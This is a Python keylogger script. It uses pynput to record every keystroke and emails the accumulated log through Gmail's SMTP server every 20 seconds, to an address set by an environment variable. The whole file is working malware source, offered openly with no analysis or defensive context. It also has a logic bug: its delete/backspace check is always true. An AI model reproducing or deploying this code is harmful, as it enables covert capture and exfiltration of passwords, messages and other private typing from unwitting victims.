from pynput import keyboard
import threading 
import sys 
import os
import smtplib

PASSWORD = os.environ.get("SMTP_PASSWORD")
MAIL = os.environ.get("MAIL")

class Keylogger:
    def __init__(self,time_interval, email_from , email_to, password):
        self.email_from = email_from
        self.email_to = email_to
        self.password = password
        self.interval = time_interval
        self.log = ' '
        self.exit = False
    
    def append_to_log(self,string):
        self.log = self.log + string
        
    def on_press(self,key):
        try:
            x = key.char
        except AttributeError:
            if key == keyboard.Key.enter:
                x = '\n'
            elif key == keyboard.Key.space:
                x = ' '
            elif key == keyboard.Key.f15:
                self.exit = True
                return False
# delete and backspace ON
            elif key == keyboard.Key.delete or keyboard.Key.backspace:
                self.log = self.log[:len(self.log)-1]
                x = ''
            else:
                x = '#'
        current_key = x
        
# adding key to self.log 
        self.append_to_log(current_key)
    
    def sending_mail(self):
# if press f15 exit program 
        if self.exit == True:
              sys.exit()
        
# implementing email sender
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email_from, self.password)
        server.sendmail(self.email_from,self.email_to,self.log)
        server.quit()
        self.log = ' '
        
# create another thread 
        timer = threading.Timer(self.interval, self.sending_mail)
        timer.start()
        timer.join()
        
    def start(self):
        listener = keyboard.Listener(on_press = self.on_press)
        with listener:
            self.sending_mail()
            listener.join()

# start      
g = Keylogger(20,"k23574745@gmail.com",MAIL,PASSWORD)
g.start()
